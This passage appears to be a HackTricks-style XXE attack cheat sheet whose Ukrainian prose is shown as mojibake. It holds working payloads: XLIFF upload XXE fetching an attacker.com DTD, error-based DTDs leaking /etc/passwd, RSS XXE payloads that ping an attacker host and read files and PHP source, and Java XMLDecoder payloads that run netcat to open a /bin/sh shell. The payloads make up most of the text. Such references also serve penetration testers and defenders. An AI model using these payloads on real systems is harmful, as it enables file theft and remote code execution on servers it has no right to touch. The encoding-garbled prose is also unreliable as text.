XLIFF (XML Localization Interchange File Format) –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—î—Ç—å—Å—è –¥–ª—è —Å—Ç–∞–Ω–¥–∞—Ä—Ç–∏–∑–∞—Ü—ñ—ó –æ–±–º—ñ–Ω—É –¥–∞–Ω–∏–º–∏ –≤ –ø—Ä–æ—Ü–µ—Å–∞—Ö –ª–æ–∫–∞–ª—ñ–∑–∞—Ü—ñ—ó. –¶–µ —Ñ–æ—Ä–º–∞—Ç –Ω–∞ –æ—Å–Ω–æ–≤—ñ XML, —è–∫–∏–π –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—î—Ç—å—Å—è –ø–µ—Ä–µ–≤–∞–∂–Ω–æ –¥–ª—è –ø–µ—Ä–µ–¥–∞—á—ñ –ª–æ–∫–∞–ª—ñ–∑–æ–≤–∞–Ω–∏—Ö –¥–∞–Ω–∏—Ö –º—ñ–∂ —ñ–Ω—Å—Ç—Ä—É–º–µ–Ω—Ç–∞–º–∏ –ø—ñ–¥ —á–∞—Å –ª–æ–∫–∞–ª—ñ–∑–∞—Ü—ñ—ó —Ç–∞ —è–∫ –∑–∞–≥–∞–ª—å–Ω–∏–π —Ñ–æ—Ä–º–∞—Ç –æ–±–º—ñ–Ω—É –¥–ª—è —ñ–Ω—Å—Ç—Ä—É–º–µ–Ω—Ç—ñ–≤ CAT (Computer-Aided Translation).

### –ê–Ω–∞–ª—ñ–∑ —Å–ª—ñ–ø–æ–≥–æ –∑–∞–ø–∏—Ç—É

–ó–∞–ø–∏—Ç –Ω–∞–¥—Å–∏–ª–∞—î—Ç—å—Å—è –Ω–∞ —Å–µ—Ä–≤–µ—Ä —ñ–∑ –Ω–∞—Å—Ç—É–ø–Ω–∏–º –≤–º—ñ—Å—Ç–æ–º:
```xml
------WebKitFormBoundaryqBdAsEtYaBjTArl3
Content-Disposition: form-data; name="file"; filename="xxe.xliff"
Content-Type: application/x-xliff+xml

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE XXE [
<!ENTITY % remote SYSTEM "http://redacted.burpcollaborator.net/?xxe_test"> %remote; ]>
<xliff srcLang="en" trgLang="ms-MY" version="2.0"></xliff>
------WebKitFormBoundaryqBdAsEtYaBjTArl3--
```
–ü—Ä–æ—Ç–µ —Ü–µ–π –∑–∞–ø–∏—Ç —Å–ø—Ä–∏—á–∏–Ω—é—î –≤–Ω—É—Ç—Ä—ñ—à–Ω—é –ø–æ–º–∏–ª–∫—É —Å–µ—Ä–≤–µ—Ä–∞, –∑–æ–∫—Ä–µ–º–∞ –∑–∞–∑–Ω–∞—á–∞—é—á–∏ –ø—Ä–æ–±–ª–µ–º—É –∑ –æ–≥–æ–ª–æ—à–µ–Ω–Ω—è–º —Ä–æ–∑–º—ñ—Ç–∫–∏:
```json
{"status":500,"error":"Internal Server Error","message":"Error systemId: http://redacted.burpcollaborator.net/?xxe_test; The markup declarations contained or pointed to by the document type declaration must be well-formed."}
```
–ù–µ–∑–≤–∞–∂–∞—é—á–∏ –Ω–∞ –ø–æ–º–∏–ª–∫—É, –Ω–∞ Burp Collaborator –∑–∞—Ñ—ñ–∫—Å–æ–≤–∞–Ω–æ –ø–æ–ø–∞–¥–∞–Ω–Ω—è, —â–æ —Å–≤—ñ–¥—á–∏—Ç—å –ø—Ä–æ –ø–µ–≤–Ω–∏–π —Ä—ñ–≤–µ–Ω—å –≤–∑–∞—î–º–æ–¥—ñ—ó –∑ –∑–æ–≤–Ω—ñ—à–Ω—å–æ—é —Å—É—Ç–Ω—ñ—Å—Ç—é.

–í–∏—Ç—ñ–∫ –¥–∞–Ω–∏—Ö –ø–æ–∑–∞ –º–µ–∂–∞–º–∏ –∫–∞–Ω–∞–ª—É –î–ª—è –≤–∏—Ç—ñ–∫–∞–Ω–Ω—è –¥–∞–Ω–∏—Ö –≤—ñ–¥–ø—Ä–∞–≤–ª—è—î—Ç—å—Å—è –∑–º—ñ–Ω–µ–Ω–∏–π –∑–∞–ø–∏—Ç:
```
------WebKitFormBoundaryqBdAsEtYaBjTArl3
Content-Disposition: form-data; name="file"; filename="xxe.xliff"
Content-Type: application/x-xliff+xml

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE XXE [
<!ENTITY % remote SYSTEM "http://attacker.com/evil.dtd"> %remote; ]>
<xliff srcLang="en" trgLang="ms-MY" version="2.0"></xliff>
------WebKitFormBoundaryqBdAsEtYaBjTArl3--
```
–¶–µ–π –ø—ñ–¥—Ö—ñ–¥ –ø–æ–∫–∞–∑—É—î, —â–æ User Agent –≤–∫–∞–∑—É—î –Ω–∞ –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–Ω—è Java 1.8. –í—ñ–¥–æ–º–∏–º –æ–±–º–µ–∂–µ–Ω–Ω—è–º —Ü—ñ—î—ó –≤–µ—Ä—Å—ñ—ó Java —î –Ω–µ–º–æ–∂–ª–∏–≤—ñ—Å—Ç—å –æ—Ç—Ä–∏–º–∞–Ω–Ω—è —Ñ–∞–π–ª—ñ–≤, —â–æ –º—ñ—Å—Ç—è—Ç—å —Å–∏–º–≤–æ–ª –Ω–æ–≤–æ–≥–æ —Ä—è–¥–∫–∞, —Ç–∞–∫–∏—Ö —è–∫ /etc/passwd, –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é —Ç–µ—Ö–Ω—ñ–∫–∏ Out of Band.

–ï–∫—Å—Ç—Ä–∞–∫—Ü—ñ—è –¥–∞–Ω–∏—Ö –Ω–∞ –æ—Å–Ω–æ–≤—ñ –ø–æ–º–∏–ª–æ–∫ –î–ª—è –ø–æ–¥–æ–ª–∞–Ω–Ω—è —Ü—å–æ–≥–æ –æ–±–º–µ–∂–µ–Ω–Ω—è –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—î—Ç—å—Å—è –ø—ñ–¥—Ö—ñ–¥ –Ω–∞ –æ—Å–Ω–æ–≤—ñ –ø–æ–º–∏–ª–æ–∫. –§–∞–π–ª DTD –º–∞—î —Ç–∞–∫—É —Å—Ç—Ä—É–∫—Ç—É—Ä—É, —â–æ–± –≤–∏–∫–ª–∏–∫–∞—Ç–∏ –ø–æ–º–∏–ª–∫—É, —è–∫–∞ –≤–∫–ª—é—á–∞—î –¥–∞–Ω—ñ –∑ —Ü—ñ–ª—å–æ–≤–æ–≥–æ —Ñ–∞–π–ª—É:
```xml
<!ENTITY % data SYSTEM "file:///etc/passwd">
<!ENTITY % foo "<!ENTITY &#37; xxe SYSTEM 'file:///nofile/'>">
%foo;
%xxe;
```
–°–µ—Ä–≤–µ—Ä –≤—ñ–¥–ø–æ–≤—ñ–¥–∞—î –ø–æ–º–∏–ª–∫–æ—é, –≤–∞–∂–ª–∏–≤–æ –≤—ñ–¥–æ–±—Ä–∞–∂–∞—é—á–∏ –Ω–µ—ñ—Å–Ω—É—é—á–∏–π —Ñ–∞–π–ª, —â–æ –≤–∫–∞–∑—É—î –Ω–∞ —Ç–µ, —â–æ —Å–µ—Ä–≤–µ—Ä –Ω–∞–º–∞–≥–∞—î—Ç—å—Å—è –æ—Ç—Ä–∏–º–∞—Ç–∏ –¥–æ—Å—Ç—É–ø –¥–æ –≤–∫–∞–∑–∞–Ω–æ–≥–æ —Ñ–∞–π–ª—É:
```javascript
{"status":500,"error":"Internal Server Error","message":"IO error.\nReason: /nofile (No such file or directory)"}
```
–©–æ–± –≤–∫–ª—é—á–∏—Ç–∏ –≤–º—ñ—Å—Ç —Ñ–∞–π–ª—É —É –ø–æ–≤—ñ–¥–æ–º–ª–µ–Ω–Ω—è –ø—Ä–æ –ø–æ–º–∏–ª–∫—É, —Ñ–∞–π–ª DTD –Ω–∞–ª–∞—à—Ç–æ–≤—É—î—Ç—å—Å—è:
```xml
<!ENTITY % data SYSTEM "file:///etc/passwd">
<!ENTITY % foo "<!ENTITY &#37; xxe SYSTEM 'file:///nofile/%data;'>">
%foo;
%xxe;
```
–¶—è –º–æ–¥–∏—Ñ—ñ–∫–∞—Ü—ñ—è –ø—Ä–∏–∑–≤–æ–¥–∏—Ç—å –¥–æ —É—Å–ø—ñ—à–Ω–æ–≥–æ –≤–∏—Ç—ñ–∫–∞–Ω–Ω—è –≤–º—ñ—Å—Ç—É —Ñ–∞–π–ª—É, –æ—Å–∫—ñ–ª—å–∫–∏ –≤—ñ–Ω –≤—ñ–¥–æ–±—Ä–∞–∂–∞—î—Ç—å—Å—è –≤ –≤–∏—Ö—ñ–¥–Ω–∏—Ö –¥–∞–Ω–∏—Ö –ø—Ä–æ –ø–æ–º–∏–ª–∫—É, –≤—ñ–¥–ø—Ä–∞–≤–ª–µ–Ω–∏—Ö —á–µ—Ä–µ–∑ HTTP. –¶–µ —Å–≤—ñ–¥—á–∏—Ç—å –ø—Ä–æ —É—Å–ø—ñ—à–Ω—É –∞—Ç–∞–∫—É XXE (–∑–æ–≤–Ω—ñ—à–Ω—ñ —Å—É—Ç–Ω–æ—Å—Ç—ñ XML), –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—é—á–∏ —è–∫ —Ç–µ—Ö–Ω—ñ–∫–∏ Out of Band, —Ç–∞–∫ —ñ –Ω–∞ –æ—Å–Ω–æ–≤—ñ –ø–æ–º–∏–ª–æ–∫, –¥–ª—è –≤–∏–ª—É—á–µ–Ω–Ω—è —á—É—Ç–ª–∏–≤–æ—ó —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—ó.

## RSS - XEE

–î—ñ–π—Å–Ω–∏–π XML —É —Ñ–æ—Ä–º–∞—Ç—ñ RSS –¥–ª—è –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–Ω—è —É—Ä–∞–∑–ª–∏–≤–æ—Å—Ç—ñ XXE.

### Ping back

–ü—Ä–æ—Å—Ç–∏–π HTTP-–∑–∞–ø–∏—Ç –Ω–∞ —Å–µ—Ä–≤–µ—Ä –∑–ª–æ–≤–º–∏—Å–Ω–∏–∫–∞
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE title [ <!ELEMENT title ANY >
<!ENTITY xxe SYSTEM "http://<AttackIP>/rssXXE" >]>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
<channel>
<title>XXE Test Blog</title>
<link>http://example.com/</link>
<description>XXE Test Blog</description>
<lastBuildDate>Mon, 02 Feb 2015 00:00:00 -0000</lastBuildDate>
<item>
<title>&xxe;</title>
<link>http://example.com</link>
<description>Test Post</description>
<author>author@example.com</author>
<pubDate>Mon, 02 Feb 2015 00:00:00 -0000</pubDate>
</item>
</channel>
</rss>
```
### –ü—Ä–æ—á–∏—Ç–∞—Ç–∏ —Ñ–∞–π–ª

```xml
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<stockCheck><productId>&xxe;</productId></stockCheck>
```
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE title [ <!ELEMENT title ANY >
<!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
<channel>
<title>The Blog</title>
<link>http://example.com/</link>
<description>A blog about things</description>
<lastBuildDate>Mon, 03 Feb 2014 00:00:00 -0000</lastBuildDate>
<item>
<title>&xxe;</title>
<link>http://example.com</link>
<description>a post</description>
<author>author@example.com</author>
<pubDate>Mon, 03 Feb 2014 00:00:00 -0000</pubDate>
</item>
</channel>
</rss>
```
### –ß–∏—Ç–∞–Ω–Ω—è –≤–∏—Ö—ñ–¥–Ω–æ–≥–æ –∫–æ–¥—É

–í–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–Ω—è —Ñ—ñ–ª—å—Ç—Ä–∞ PHP base64
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE title [ <!ELEMENT title ANY >
<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=file:///challenge/web-serveur/ch29/index.php" >]>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
<channel>
<title>The Blog</title>
<link>http://example.com/</link>
<description>A blog about things</description>
<lastBuildDate>Mon, 03 Feb 2014 00:00:00 -0000</lastBuildDate>
<item>
<title>&xxe;</title>
<link>http://example.com</link>
<description>a post</description>
<author>author@example.com</author>
<pubDate>Mon, 03 Feb 2014 00:00:00 -0000</pubDate>
</item>
</channel>
</rss>
```
## Java XMLDecoder XEE –¥–æ RCE

XMLDecoder - —Ü–µ –∫–ª–∞—Å Java, —è–∫–∏–π —Å—Ç–≤–æ—Ä—é—î –æ–±'—î–∫—Ç–∏ –Ω–∞ –æ—Å–Ω–æ–≤—ñ XML-–ø–æ–≤—ñ–¥–æ–º–ª–µ–Ω–Ω—è. –Ø–∫—â–æ –∑–ª–æ–≤–º–∏—Å–Ω–∏–π –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á –º–æ–∂–µ –∑–º—É—Å–∏—Ç–∏ –¥–æ–¥–∞—Ç–æ–∫ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏ –¥–æ–≤—ñ–ª—å–Ω—ñ –¥–∞–Ω—ñ –ø—Ä–∏ –≤–∏–∫–ª–∏–∫—É –º–µ—Ç–æ–¥—É **readObject**, –≤—ñ–Ω –º–∏—Ç—Ç—î–≤–æ –æ—Ç—Ä–∏–º–∞—î –≤–∏–∫–æ–Ω–∞–Ω–Ω—è –∫–æ–¥—É –Ω–∞ —Å–µ—Ä–≤–µ—Ä—ñ.

### –í–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–Ω—è Runtime().exec()
```xml
<?xml version="1.0" encoding="UTF-8"?>
<java version="1.7.0_21" class="java.beans.XMLDecoder">
<object class="java.lang.Runtime" method="getRuntime">
<void method="exec">
<array class="java.lang.String" length="6">
<void index="0">
<string>/usr/bin/nc</string>
</void>
<void index="1">
<string>-l</string>
</void>
<void index="2">
<string>-p</string>
</void>
<void index="3">
<string>9999</string>
</void>
<void index="4">
<string>-e</string>
</void>
<void index="5">
<string>/bin/sh</string>
</void>
</array>
</void>
</object>
</java>
```
### ProcessBuilder

### ProcessBuilder
```xml
<?xml version="1.0" encoding="UTF-8"?>
<java version="1.7.0_21" class="java.beans.XMLDecoder">
<void class="java.lang.ProcessBuilder">
<array class="java.lang.String" length="6">
<void index="0">
<string>/usr/bin/nc</string>
</void>
<void index="1">
<string>-l</string>
</void>
<void index="2">
<string>-p</string>
</void>
<void index="3">
<string>9999</string>
</void>
<void index="4">
<string>-e</string>
</void>
<void index="5">
<string>/bin/sh</string>
</void>
</array>
<void method="start" id="process">
</void>
</void>
</java>
```
## –Ü–Ω—Å—Ç—Ä—É–º–µ–Ω—Ç–∏

{% embed url="https://github.com/luisfontes19/xxexploiter" %}

## –ü–æ—Å–∏–ª–∞–Ω–Ω—è

* [https://media.blackhat.com/eu-13/briefings/Osipov/bh-eu-13-XML-data-osipov-slides.pdf](https://media.blackhat.com/eu-13/briefings/Osipov/bh-eu-13-XML-data-osipov-slides.pdf)\\
* [https://web-in-security.blogspot.com/2016/03/xxe-cheat-sheet.html](https://web-in-security.blogspot.com/2016/03/xxe-cheat-sheet.html)\\
* –í–∏–ª—É—á–µ–Ω–Ω—è —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—ó —á–µ—Ä–µ–∑ HTTP –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é –≤–ª–∞—Å–Ω–æ–≥–æ –∑–æ–≤–Ω—ñ—à–Ω—å–æ–≥–æ DTD: [https://ysx.me.uk/from-rss-to-xxe-feed-parsing-on-hootsuite/](https://ysx.me.uk/from-rss-to-xxe-feed-parsing-on-hootsuite/)\\
* [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20injection)\\
* [https://gist.github.com/staaldraad/01415b990939494879b4](https://gist.github.com/staaldraad/01415b990939494879b4)\\
* [https://medium.com/@onehackman/exploiting-xml-external-entity-xxe-injections-b0e3eac388f9](https://medium.com/@onehackman/exploiting-xml-external-entity-xxe-injections-b0e3eac388f9)\\
* [https://portswigger.net/web-security/xxe](https://portswigger.net/web-security/xxe)\\
* [https://gosecure.github.io/xxe-workshop/#7](https://gosecure.github.io/xxe-workshop/#7)

<details>

<summary><strong>–í–∏–≤—á–∞–π—Ç–µ —Ö–∞–∫—ñ–Ω–≥ AWS –≤—ñ–¥ –Ω—É–ª—è –¥–æ –≥–µ—Ä–æ—è –∑</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

–Ü–Ω—à—ñ —Å–ø–æ—Å–æ–±–∏ –ø—ñ–¥—Ç—Ä–∏–º–∫–∏ HackTricks:

* –Ø–∫—â–æ –≤–∏ —Ö–æ—á–µ—Ç–µ –ø–æ–±–∞—á–∏—Ç–∏ –≤–∞—à—É **–∫–æ–º–ø–∞–Ω—ñ—é —Ä–µ–∫–ª–∞–º–æ–≤–∞–Ω—É –≤ HackTricks** –∞–±–æ **–∑–∞–≤–∞–Ω—Ç–∞–∂–∏—Ç–∏ HackTricks —É —Ñ–æ—Ä–º–∞—Ç—ñ PDF**, –ø–µ—Ä–µ–≤—ñ—Ä—Ç–µ [**–ü–õ–ê–ù–ò –ü–Ü–î–ü–ò–°–ö–ò**](https://github.com/sponsors/carlospolop)!
* –û—Ç—Ä–∏–º–∞–π—Ç–µ [**–æ—Ñ—ñ—Ü—ñ–π–Ω–∏–π PEASS & HackTricks –º–µ—Ä—á**](https://peass.creator-spring.com)
* –í—ñ–¥–∫—Ä–∏–π—Ç–µ –¥–ª—è —Å–µ–±–µ [**–°—ñ–º'—é PEASS**](https://opensea.io/collection/the-peass-family), –Ω–∞—à—É –∫–æ–ª–µ–∫—Ü—ñ—é –µ–∫—Å–∫–ª—é–∑–∏–≤–Ω–∏—Ö [**NFT**](https://opensea.io/collection/the-peass-family)
* **–ü—Ä–∏—î–¥–Ω—É–π—Ç–µ—Å—å –¥–æ** üí¨ [**–≥—Ä—É–ø–∏ Discord**](https://discord.gg/hRep4RUj7f) –∞–±–æ [**–≥—Ä—É–ø–∏ Telegram**](https://t.me/peass) –∞–±–æ **—Å–ª—ñ–¥–∫—É–π—Ç–µ** –∑–∞ –Ω–∞–º–∏ –Ω–∞ **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **–ü–æ–¥—ñ–ª—ñ—Ç—å—Å—è —Å–≤–æ—ó–º–∏ —Ö–∞–∫–µ—Ä—Å—å–∫–∏–º–∏ —Ç—Ä—é–∫–∞–º–∏, –Ω–∞–¥—Å–∏–ª–∞–π—Ç–µ PR –¥–æ** [**HackTricks**](https://github.com/carlospolop/hacktricks) —Ç–∞ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github —Ä–µ–ø–æ–∑–∏—Ç–æ—Ä—ñ—ó–≤.

</details>
